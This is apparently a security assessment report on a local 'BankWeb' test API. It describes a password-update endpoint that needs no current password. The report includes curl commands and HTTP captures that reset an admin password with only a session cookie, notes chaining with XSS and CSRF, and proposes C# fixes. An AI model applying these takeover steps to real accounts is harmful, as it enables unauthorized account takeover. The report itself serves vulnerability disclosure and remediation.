# Issue #16 — Insecure Password Update — No Current Password Verification

| Field         | Details                                                        |
|---------------|----------------------------------------------------------------|
| **Target**    | BankWeb API — `http://localhost:1337/api/User/ProfilePasswordUpdate` |
| **Severity**  | High                                                           |
| **CVSS v3.1** | 8.1                                                            |
| **Vector**    | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N                           |
| **Category**  | Broken Authentication — Missing Re-authentication    |

---

## Summary

The password update endpoint `/api/User/ProfilePasswordUpdate` accepts a `newPassword` parameter and immediately applies it to the authenticated user's account without requiring the current password to be provided or verified. A valid session is sufficient to change the account password — no knowledge of the existing credentials is needed.

This design flaw elevates the impact of any vulnerability that grants temporary session access — including the stored XSS on the admin panel (Issue #09) and the reflected XSS (Issue #10) — from session hijacking into full, persistent account takeover. An attacker who obtains a session token, even briefly, can lock the legitimate user out of their account entirely by resetting the password before the session expires.

Exploitation was fully confirmed: the admin account password was changed to an attacker-controlled value using only the active session cookie, and subsequent login with the new password succeeded.

---

## Steps to Reproduce

1. Obtain an active session cookie for any target account (via XSS session hijacking, credential theft from Issue #08, or any other means).
2. Send a `POST` request to `/api/User/ProfilePasswordUpdate` with only the new password — no current password field required:

   ```bash
   curl -s -X POST "http://localhost:1337/api/User/ProfilePasswordUpdate" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -H "Cookie: SessionId=[REDACTED]" \
     -d "newPassword=[REDACTED-NEW-PASSWORD]"
   ```

3. Observe that the server responds with `HTTP 200` and an empty JSON object `{}` — confirming the password was updated with no challenge.
4. Confirm the password change took effect by logging in with the new credentials:

   ```bash
   curl -s -X POST "http://localhost:1337/api/Auth/Login" \
     -H "Content-Type: application/json" \
     -d '{"UserName":"[REDACTED]","Password":"[REDACTED-NEW-PASSWORD]"}'
   ```

5. Observe that the server issues a new `SessionId` cookie, confirming successful authentication with the attacker-set password.

---

## Proof of Concept

### Stage 1 — Password Change (No Current Password Required)

**Request:**

```http
POST /api/User/ProfilePasswordUpdate HTTP/1.1
Host: localhost:1337
Content-Type: application/x-www-form-urlencoded
Content-Length: 17
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Origin: http://localhost:1337
Cookie: SessionId=[REDACTED]

newPassword=[REDACTED-NEW-PASSWORD]
```

**Response:**

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Date: Wed, 09 Jul 2025 14:37:49 GMT
Server: Kestrel
Content-Length: 2

{}
```

The server accepts the request and updates the password without prompting for the current credentials. The request body contains only `newPassword` — there is no `currentPassword`, `oldPassword`, or equivalent field in the API contract.

---

### Stage 2 — Confirmed Account Takeover via Login

**Request:**

```http
POST /api/Auth/Login HTTP/1.1
Host: localhost:1337
Content-Type: application/json
Content-Length: 56
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36

{"UserName":"[REDACTED]","Password":"[REDACTED-NEW-PASSWORD]"}
```

**Response:**

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Date: Wed, 09 Jul 2025 14:39:21 GMT
Server: Kestrel
Set-Cookie: SessionId=[REDACTED-NEW-SESSION]; expires=Thu, 10 Jul 2025 14:39:21 GMT; path=/
Content-Length: 238

{"id":0,"userName":"[REDACTED]","password":null,...,"status":"ok",...}
```

The server issues a new authenticated session for the account using the attacker-controlled password, confirming full account takeover. The legitimate account owner — now locked out — cannot recover access without out-of-band intervention, as the password recovery flow would also be under the attacker's control if the recovery email address has been compromised.

> **Note:** Account identifiers, passwords, and session tokens have been fully redacted throughout both stages of this proof of concept.

---

## Impact

- **Persistent account takeover from transient session access** — any vulnerability that grants even brief, read-only session access (XSS cookie theft, session fixation, network interception) is escalated to permanent account takeover. The attacker can change the password and invalidate the legitimate user's access before the original session expires.
- **Admin account compromise** — this finding was demonstrated against an admin-level account. Combined with the admin panel XSS (Issue #09, Vector B) — which fires specifically when an admin visits `/admin` — an attacker can silently steal an admin session and immediately use it to reset the admin password, achieving persistent privileged access.
- **No re-authentication barrier** — legitimate password change flows universally require the current password as proof of identity, precisely to prevent this scenario. The absence of this check means the session cookie alone acts as sufficient authorisation for a highly destructive account action.
- **CSRF amplification** — without current password verification, a CSRF attack against this endpoint would be sufficient to trigger a password reset. If the endpoint also lacks CSRF token validation, an attacker could embed a cross-origin form submission in any page the victim visits and silently reset their password without any XSS or session theft required.
- **No notification or audit trail** — if the application does not send a password change notification email to the account holder, the legitimate user may remain unaware of the compromise until they are locked out, delaying any incident response.

---

## Recommended Mitigations

1. **Require the current password** for all password change operations. The server must verify the submitted `currentPassword` against the stored credential before accepting any `newPassword` value:

   ```csharp
   [HttpPost("ProfilePasswordUpdate")]
   [Authorize]
   public async Task<IActionResult> UpdatePassword([FromForm] PasswordUpdateRequest request)
   {
       var username = User.Identity.Name;
       var user = await _userService.GetUserAsync(username);

       if (!_passwordHasher.Verify(request.CurrentPassword, user.PasswordHash))
           return Unauthorized(new { error = "Current password is incorrect." });

       await _userService.UpdatePasswordAsync(username, request.NewPassword);
       return Ok();
   }
   ```

2. **Invalidate all existing sessions upon password change.** Once a password is successfully changed, all previously issued session tokens for the account should be revoked, forcing any attacker who relied on a stolen session to re-authenticate — which they cannot do without the new password:

   ```csharp
   await _sessionService.RevokeAllSessionsAsync(username);
   ```

3. **Send an immediate notification email** to the account holder's registered address whenever a password change occurs. This provides the legitimate user with an out-of-band alert and an opportunity to initiate account recovery if the change was unauthorised.

4. **Validate CSRF tokens on this endpoint.** Password change is a state-modifying operation and must be protected against cross-site request forgery, regardless of whether current password verification is added.

5. **Hash passwords at rest.** As noted in Issue #08, passwords are currently stored in plaintext. This is a prerequisite fix — the `Verify` pattern in the mitigation above assumes a proper hashing scheme such as bcrypt or Argon2 is in place.